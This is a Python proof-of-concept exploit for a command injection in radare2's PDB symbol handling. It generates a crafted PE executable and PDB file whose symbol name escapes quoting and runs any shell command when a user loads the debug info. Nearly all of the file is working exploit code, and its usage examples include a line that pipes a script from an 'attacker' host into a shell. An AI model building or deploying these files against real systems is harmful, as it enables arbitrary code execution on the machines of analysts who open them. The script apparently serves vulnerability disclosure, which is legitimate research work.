#!/usr/bin/env python3
"""
CVE PoC: radare2 PDB Command Injection via Global Symbol Names
================================================================
Generates a target.exe + debug.pdb pair that executes an arbitrary
shell command when a user loads the PDB in radare2 with `idp`.

Vulnerability:  libr/bin/format/pdb/pdb.c:1458
Affected:       radare2 (confirmed on current master, commit 63199824f6)

Usage:
    python3 poc.py --cmd 'id'
    python3 poc.py --cmd 'echo PWNED > /tmp/pwned'
    python3 poc.py --cmd 'curl http://attacker/shell.sh | sh'

Then:
    r2 -c 'idp; q' target.exe        # automatic trigger
    r2 target.exe  →  idp             # interactive trigger
"""

import argparse
import struct
import os
import sys

# ── helpers ──────────────────────────────────────────────────────────

def p8(v):  return struct.pack('<B', v & 0xFF)
def p16(v): return struct.pack('<H', v & 0xFFFF)
def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)
def p64(v): return struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)

PAGE = 4096
PDB7_SIG = b'Microsoft C/C++ MSF 7.00\r\n\x1aDS\x00\x00\x00'

def pad(data, size):
    assert len(data) <= size, f"data ({len(data)}) exceeds page ({size})"
    return data + b'\x00' * (size - len(data))

# ── PDB builder ─────────────────────────────────────────────────────

def build_pdb(payload_symbol_name):
    """
    Craft a minimal valid MSF 7.0 (PDB) file with a single global symbol
    whose name is the injection payload.

    Page layout:
        0  Superblock (header)
        1  Root index  (page numbers of root-data pages)
        2  Root data   (stream directory)
        3  Stream 1 – PDB info
        4  Stream 2 – TPI (type info, empty)
        5  Stream 3 – DBI (debug info) + dbghdr
        6  Stream 4 – Global symbols  ← payload lives here
        7  Stream 5 – PE section headers (.text)
    """

    TOTAL_PAGES = 8

    # ── stream 1: PDB info ───────────────────────────────────────────
    s1  = p32(20000404)          # version (VC70)
    s1 += p32(0x12345678)        # timestamp
    s1 += p32(1)                 # age
    s1 += p32(0xAABBCCDD)        # guid.data1
    s1 += p16(0x1122)            # guid.data2
    s1 += p16(0x3344)            # guid.data3
    s1 += b'\xAB' * 8           # guid.data4[8]
    s1 += p32(0)                 # cb_names (no named streams)

    # ── stream 2: TPI (no types) ─────────────────────────────────────
    s2  = p32(20040203)          # version
    s2 += p32(56)                # header size
    s2 += p32(0x1000)            # TypeIndexBegin
    s2 += p32(0x1000)            # TypeIndexEnd  (begin == end → 0 types)
    s2 += p32(0)                 # follow_size
    s2 += p16(0xFFFF)            # hash_stream_idx  = -1
    s2 += p16(0xFFFF)            # hash_aux_stream_idx = -1
    s2 += p32(0) * 2             # hash_key_size, buckets
    s2 += p32(0) * 6             # hash_val, idx_off, hash_adj  (off+cb each)
    s2 += b'\x00' * 256          # padding (sizeof(STPIHeader) may vary)

    # ── stream 5: one PE section header (.text) ──────────────────────
    s5  = b'.text\x00\x00\x00'  # name[8]
    s5 += p32(0x1000)            # VirtualSize
    s5 += p32(0x1000)            # VirtualAddress
    s5 += p32(0x200)             # SizeOfRawData
    s5 += p32(0x200)             # PointerToRawData
    s5 += p32(0) * 2             # relocs / linenums
    s5 += p16(0) * 2
    s5 += p32(0x60000020)        # Characteristics

    # ── stream 3: DBI header (64 B) + dbghdr (22 B) ─────────────────
    s3  = p32(0xFFFFFFFF)        # magic
    s3 += p32(19990903)          # version
    s3 += p32(1)                 # age
    s3 += p16(0xFFFF)            # gssymStream  = -1
    s3 += p16(0)                 # vers
    s3 += p16(0xFFFF)            # pssymStream  = -1
    s3 += p16(0)                 # pdbver
    s3 += p16(4)                 # symrecStream = 4  (→ stream 4, our GSYM)
    s3 += p16(0)                 # pdbver2
    s3 += p32(0)                 # module_size
    s3 += p32(0)                 # seccon_size
    s3 += p32(0)                 # secmap_size
    s3 += p32(0)                 # filinf_size
    s3 += p32(0)                 # tsmap_size
    s3 += p32(0)                 # mfc_index
    s3 += p32(22)                # dbghdr_size  (11 × 2)
    s3 += p32(0)                 # ecinfo_size
    s3 += p16(0)                 # flags
    s3 += p16(0x8664)            # machine (AMD64)
    s3 += p32(0)                 # resvd
    # dbghdr – parse_dbg_header() reads exactly 11 st16 values:
    s3 += p16(0xFFFF)            #  [0] sn_fpo
    s3 += p16(0xFFFF)            #  [1] sn_exception
    s3 += p16(0xFFFF)            #  [2] sn_fixup
    s3 += p16(0xFFFF)            #  [3] sn_omap_to_src
    s3 += p16(0xFFFF)            #  [4] sn_omap_from_src
    s3 += p16(5)                 #  [5] sn_section_hdr  → stream 5
    s3 += p16(0xFFFF)            #  [6] sn_token_rid_map
    s3 += p16(0xFFFF)            #  [7] sn_xdata
    s3 += p16(0xFFFF)            #  [8] sn_pdata
    s3 += p16(0xFFFF)            #  [9] sn_new_fpo
    s3 += p16(0xFFFF)            # [10] sn_section_hdr_orig

    # ── stream 4: global symbols ─────────────────────────────────────
    sym_name = payload_symbol_name.encode() + b'\x00'
    rec  = p16(0x110E)           # leaf_type = S_GDATA32
    rec += p32(0)                # symtype
    rec += p32(0)                # offset
    rec += p16(1)                # segment = 1  (→ section_hdrs[0])
    rec += sym_name
    s4  = p16(len(rec)) + rec    # length-prefixed record
    s4 += p16(0)                 # terminator

    # ── root stream (stream directory) ───────────────────────────────
    sizes = [0, len(s1), len(s2), len(s3), len(s4), len(s5)]
    pages = [[], [3], [4], [5], [6], [7]]   # stream 0 has size 0 → no pages

    root  = p32(len(sizes))
    for sz in sizes:
        root += p32(sz)
    for pg_list in pages:
        for pg in pg_list:
            root += p32(pg)
    root += b'\x00' * 256        # padding for tmp_data_max_size check
    root_size = len(root)
    assert root_size < PAGE

    # ── assemble pages ─────────────────────────────────────────���─────
    # page 0 – superblock
    p0  = PDB7_SIG               # 32 B
    p0 += p32(PAGE)              # page_size
    p0 += p32(1)                 # alloc_tbl_ptr
    p0 += p32(TOTAL_PAGES)       # num_file_pages
    p0 += p32(root_size)         # root_size
    p0 += p32(0)                 # reserved
    p0 += p32(1)                 # root-index page number  (→ page 1)

    return (pad(p0, PAGE)
          + pad(p32(2), PAGE)    # page 1: root index → root data on page 2
          + pad(root, PAGE)      # page 2: root data
          + pad(s1, PAGE)        # page 3: stream 1
          + pad(s2, PAGE)        # page 4: stream 2
          + pad(s3, PAGE)        # page 5: stream 3
          + pad(s4, PAGE)        # page 6: stream 4
          + pad(s5, PAGE))       # page 7: stream 5

# ── PE builder ──────────────────────────────────────────────────────

def build_pe(pdb_filename):
    """Minimal PE32+ with a RSDS CodeView debug directory referencing the PDB."""

    dos = bytearray(64)
    dos[0:2] = b'MZ'
    struct.pack_into('<I', dos, 60, 64)          # e_lfanew → PE header

    pe_sig = b'PE\x00\x00'

    coff  = p16(0x8664)                          # Machine: AMD64
    coff += p16(2)                               # NumberOfSections
    coff += p32(0) * 3                           # timestamps, symtab ptr, symcount
    coff += p16(240)                             # SizeOfOptionalHeader
    coff += p16(0x22)                            # Characteristics

    # ── optional header (PE32+) ──────────────────────────────────────
    opt  = p16(0x20B)                            # Magic: PE32+
    opt += p16(0)                                # Linker version
    opt += p32(0) * 3                            # code/init/uninit sizes
    opt += p32(0x1000)                           # AddressOfEntryPoint
    opt += p32(0x1000)                           # BaseOfCode
    opt += p64(0x140000000)                      # ImageBase
    opt += p32(0x1000) + p32(0x200)              # Section/FileAlignment
    opt += p16(6)+p16(0)+p16(0)+p16(0)           # OS / image version
    opt += p16(6)+p16(0)                         # Subsystem version
    opt += p32(0)                                # Win32VersionValue
    opt += p32(0x4000)                           # SizeOfImage
    opt += p32(0x200)                            # SizeOfHeaders
    opt += p32(0)                                # CheckSum
    opt += p16(3) + p16(0)                       # Subsystem=CONSOLE, DllChar
    opt += p64(0x100000) + p64(0x1000)           # StackReserve/Commit
    opt += p64(0x100000) + p64(0x1000)           # HeapReserve/Commit
    opt += p32(0) + p32(16)                      # LoaderFlags, NumberOfRvaAndSizes

    # data directories (16 entries × 8 bytes)
    dirs = bytearray(128)
    struct.pack_into('<II', dirs, 48, 0x2000, 28)  # [6] Debug: RVA, Size

    # ── section headers ──────────────────────────────────────────���───
    def section(name8, vsz, rva, rawsz, rawptr, chars):
        s  = name8
        s += p32(vsz) + p32(rva) + p32(rawsz) + p32(rawptr)
        s += p32(0) * 2 + p16(0) * 2
        s += p32(chars)
        return s

    sec_text  = section(b'.text\x00\x00\x00',  0x1000, 0x1000, 0x200, 0x200, 0x60000020)
    sec_rdata = section(b'.rdata\x00\x00',      0x1000, 0x2000, 0x200, 0x400, 0x40000040)

    headers = bytes(dos) + pe_sig + coff + opt + bytes(dirs) + sec_text + sec_rdata
    headers = pad(headers, 0x200)

    # ── .text (INT3 sled) ────────────────────────────────────────────
    text = pad(b'\xCC', 0x200)

    # ── .rdata (debug directory + CodeView RSDS) ─────────────────────
    pdb_bytes = pdb_filename.encode() + b'\x00'
    cv  = b'RSDS'                                # CV signature
    cv += b'\xAB' * 16                           # GUID  (matches PDB)
    cv += p32(1)                                 # Age
    cv += pdb_bytes                              # PDB file name

    dbg  = p32(0) * 2                            # Characteristics, TimeDateStamp
    dbg += p16(0) * 2                            # MajorVersion, MinorVersion
    dbg += p32(2)                                # Type = IMAGE_DEBUG_TYPE_CODEVIEW
    dbg += p32(len(cv))                          # SizeOfData
    dbg += p32(0x2000 + 28)                      # AddressOfRawData (RVA)
    dbg += p32(0x400 + 28)                       # PointerToRawData (file offset)

    rdata = pad(dbg + cv, 0x200)

    return headers + text + rdata

# ── payload construction ────────────────────────────────────────────

def make_payload_name(cmd):
    """
    Build the PDB symbol name that escapes the "fN" quoting and
    injects a shell command.

    The vulnerable output (pdb.c:1458):
        "fN pdb.<filtered> <RAW_NAME>"

    We set RAW_NAME to:     x" ;!<cmd> #
    Producing:              "fN pdb.x_ x" ;!<cmd> #"
    Parsed by r2 as:
        1.  "fN pdb.x_ x"      ← quoted flag-rename (harmless)
        2.  ;                   ← command separator
        3.  !<cmd>              ← shell execution
        4.  #"                  ← comment (swallows trailing quote)
    """
    return f'x" ;!{cmd} #'

# ── main ────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(
        description='Generate PE + PDB pair that exploits radare2 PDB command injection (pdb.c:1458)')
    p.add_argument('--cmd', required=True,
                   help='Shell command to execute (e.g. "id", "touch /tmp/pwned")')
    p.add_argument('--exe', default='target.exe',
                   help='Output PE filename (default: target.exe)')
    p.add_argument('--pdb', default='debug.pdb',
                   help='Output PDB filename (default: debug.pdb)')
    args = p.parse_args()

    payload = make_payload_name(args.cmd)
    print(f'[*] Command:  {args.cmd}')
    print(f'[*] Payload:  {payload}')
    print()

    pdb_data = build_pdb(payload)
    with open(args.pdb, 'wb') as f:
        f.write(pdb_data)
    print(f'[+] {args.pdb:20s}  {len(pdb_data):>6d} bytes')

    pe_data = build_pe(args.pdb)
    with open(args.exe, 'wb') as f:
        f.write(pe_data)
    print(f'[+] {args.exe:20s}  {len(pe_data):>6d} bytes')

if __name__ == '__main__':
    main()
